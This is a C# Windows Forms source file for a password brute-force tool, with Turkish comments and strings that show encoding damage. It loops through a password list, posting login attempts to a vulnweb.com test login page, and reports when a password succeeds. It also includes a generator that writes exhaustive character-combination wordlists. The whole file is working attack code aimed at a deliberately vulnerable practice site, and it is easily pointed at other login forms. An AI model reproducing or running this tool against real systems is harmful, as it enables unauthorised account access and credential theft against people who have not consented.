namespace brute_force_attack_eliforencik
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private async void btnStartAttack_ClickAsync(object sender, EventArgs e)
        {
            string username = txtUsername.Text;
            string passwordFilePath = txtPasswordList.Text.Trim();
            string url = "http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F";
            await Attack(url, username, passwordFilePath);
        }


        private async Task Attack(string url, string username, string passwordFilePath)
        {
            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Þifre listesini oku
                    var passwords = File.ReadAllLines(passwordFilePath);

                    foreach (var password in passwords)
                    {
                        // Form verisini POST veri olarak hazýrla
                        var postData = new FormUrlEncodedContent(new[]
                        {
                            new KeyValuePair<string, string>("tfUName", username),
                            new KeyValuePair<string, string>("tfUPass", password),
                            new KeyValuePair<string, string>("submit", "Login") // Bu deðerler siteye göre deðiþebilir
                        });

                        // HTTP POST isteðini gönder
                        HttpResponseMessage response = await client.PostAsync(url, postData);

                        // HTTP yanýtýný kontrol et
                        if (response.IsSuccessStatusCode)
                        {
                            // Eðer yanýt baþarýlýysa, yani 200-299 arasý kodlarsa, içerik kontrolü yap
                            string responseBody = await response.Content.ReadAsStringAsync();

                            if (responseBody.Contains("Invalid login!"))
                            {
                                // Hatalý þifre
                                richTextBoxLogs.AppendText($"Baþarýsýz giriþ denemesi. Kullanýlan þifre: {password}\n");
                            }
                            else
                            {
                                // Baþarýlý giriþ
                                richTextBoxLogs.AppendText($"Baþarýlý! Doðru þifre: {password}\n");
                                // Pop-up mesaj bildirisi göster
                                MessageBox.Show($"Doðru þifre bulundu: {password}", "Baþarýlý Giriþ", MessageBoxButtons.OK, MessageBoxIcon.Information);
                                break; // Baþarý saðlandýðýnda iþlemi durdur
                            }
                        }
                        else
                        {
                            // Yanýt baþarýlý deðilse, yanýt kodunu yazdýr
                            richTextBoxLogs.AppendText($"Hata! Yanýt kodu: {response.StatusCode}\n");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Bir hata oluþtu: " + ex.Message);
            }
        }

        private void btnSelectPasswordList_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "Metin Dosyalarý (*.txt)|*.txt";
            openFileDialog.Title = "Þifre Listesi Seçin";

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                txtPasswordList.Text = openFileDialog.FileName;
            }
        }

        private void btnOlustur_Click(object sender, EventArgs e)
        {
            int minLen = Int16.Parse(minkrktr_txt.Text);
            int maxLen = Int16.Parse(maxkrktr_txt.Text);
            string charset = set_txt.Text;
            CreateWordlist(minLen, maxLen, charset);
        }
        public void CreateWordlist(int minLen, int maxLen, string charset)
        {
            try
            {
                if (string.IsNullOrWhiteSpace(charset))
                {
                    MessageBox.Show("Karakter seti boþ olamaz!", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                // Proje dizinine kaydet
                string outputPath = Path.Combine(Application.StartupPath, "wordlist.txt");

                using (StreamWriter writer = new StreamWriter(outputPath))
                {
                    for (int length = minLen; length <= maxLen; length++)
                    {
                        GenerateCombinations(charset, "", length, writer);
                    }
                }

                if (File.Exists(outputPath))
                {
                    MessageBox.Show($"Kelime listesi baþarýyla kaydedildi!\nDosya Yolu: {outputPath}", "Baþarýlý", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Bir hata oluþtu: {ex.Message}", "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void GenerateCombinations(string charset, string prefix, int length, StreamWriter writer)
        {
            if (length == 0)
            {
                writer.WriteLine(prefix);
                return;
            }

            foreach (char c in charset)
            {
                GenerateCombinations(charset, prefix + c, length - 1, writer);
            }
        }
    }
}
